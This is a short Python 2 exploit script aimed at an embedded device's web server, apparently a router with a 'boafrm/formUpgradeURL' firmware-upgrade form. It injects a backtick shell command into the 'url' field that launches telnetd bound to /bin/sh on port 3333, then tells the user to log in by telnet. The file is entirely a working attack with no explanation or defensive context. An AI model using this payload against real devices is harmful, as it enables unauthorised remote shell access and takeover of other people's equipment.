import requests
import sys

def exp():
    if len(sys.argv) < 2:
        print 'Usage: exp.py Host\nexample: exp.py 192.168.100.106'
        exit()
    ip = sys.argv[1]
    firsturl = 'http://%s/firmware.html' % ip
    secondurl = 'http://%s/boafrm/formUpgradeURL' % ip
    result = requests.get(firsturl)
    if result.status_code != 200:
        print 'Can\'t visit this site.Please check it.'
        exit()
    data = {
        'url':'`telnetd -l /bin/sh -p 3333`',
        'timeout':'30'
    }
    result = requests.post(secondurl,data=data)
    print 'Now,you can use telnet client login to the server. telnet %s 3333' % ip
if __name__ == '__main__':
    exp()
